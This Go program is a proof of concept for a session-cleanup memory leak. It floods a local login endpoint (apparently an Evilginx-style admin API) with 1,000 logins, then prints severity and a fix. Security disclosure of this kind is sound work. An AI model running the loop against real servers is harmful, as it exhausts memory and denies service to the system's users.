package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"runtime"
	"time"
)

// ====================================================
// Proof of Concept: Memory Leak via Session Accumulation
// ====================================================
// This demonstrates the session cleanup issue
// WARNING: This will consume memory on the target system!

type LoginRequest struct {
	APIKey string `json:"api_key"`
}

type LoginResponse struct {
	Success bool   `json:"success"`
	Message string `json:"message"`
}

func main() {
	targetURL := "http://localhost:5555/api/login"
	validAPIKey := "YOUR_VALID_API_KEY_HERE" // Replace with actual key
	iterations := 1000

	fmt.Println("==========================================")
	fmt.Println("PoC: Session Memory Leak Demonstration")
	fmt.Println("==========================================")
	fmt.Println("Target:", targetURL)
	fmt.Println("Iterations:", iterations)
	fmt.Println()

	var m runtime.MemStats
	runtime.ReadMemStats(&m)
	startAlloc := m.Alloc

	fmt.Printf("Starting memory (client): %v MB\n", m.Alloc/1024/1024)
	fmt.Println("Creating sessions...")
	fmt.Println()

	successCount := 0
	startTime := time.Now()

	for i := 1; i <= iterations; i++ {
		// Create login request
		loginReq := LoginRequest{
			APIKey: validAPIKey,
		}

		jsonData, _ := json.Marshal(loginReq)

		// Send request
		resp, err := http.Post(targetURL, "application/json", bytes.NewBuffer(jsonData))
		if err != nil {
			fmt.Printf("Error on iteration %d: %v\n", i, err)
			continue
		}

		body, _ := ioutil.ReadAll(resp.Body)
		resp.Body.Close()

		var loginResp LoginResponse
		json.Unmarshal(body, &loginResp)

		if loginResp.Success {
			successCount++
			
			// Extract session cookie
			cookies := resp.Cookies()
			for _, cookie := range cookies {
				if cookie.Name == "admin_session" {
					// Session created successfully
					// Note: In real attack, would store this
				}
			}
		}

		// Progress update every 100 iterations
		if i%100 == 0 {
			runtime.ReadMemStats(&m)
			fmt.Printf("  %d sessions created | Client memory: %v MB\n", 
				successCount, m.Alloc/1024/1024)
		}

		// Small delay to not overwhelm the server
		time.Sleep(10 * time.Millisecond)
	}

	duration := time.Since(startTime)

	runtime.ReadMemStats(&m)
	endAlloc := m.Alloc

	fmt.Println()
	fmt.Println("==========================================")
	fmt.Println("Results:")
	fmt.Println("==========================================")
	fmt.Printf("Sessions created: %d\n", successCount)
	fmt.Printf("Time elapsed: %v\n", duration)
	fmt.Printf("Rate: %.2f sessions/second\n", float64(successCount)/duration.Seconds())
	fmt.Println()
	fmt.Printf("Client memory increase: %v MB\n", (endAlloc-startAlloc)/1024/1024)
	fmt.Println()
	fmt.Println("❌ VULNERABILITY DETAILS:")
	fmt.Println("------------------------------------------")
	fmt.Println("Issue: Sessions are stored in memory map but never cleaned up")
	fmt.Println("Impact:")
	fmt.Println("  - Each session consumes ~200 bytes in memory")
	fmt.Printf("  - %d sessions ≈ %v KB server memory\n", successCount, (successCount*200)/1024)
	fmt.Println("  - Expired sessions remain in memory indefinitely")
	fmt.Println("  - Eventually leads to memory exhaustion")
	fmt.Println()
	fmt.Println("Severity: HIGH")
	fmt.Println("Recommendation: Implement periodic session cleanup goroutine")
	fmt.Println("==========================================")
	fmt.Println()
	fmt.Println("Server Impact:")
	fmt.Println("  - Check server memory usage with: ps aux | grep evilginx")
	fmt.Println("  - Sessions remain in memory even after expiration")
	fmt.Println("  - Only way to clear: restart server")
}

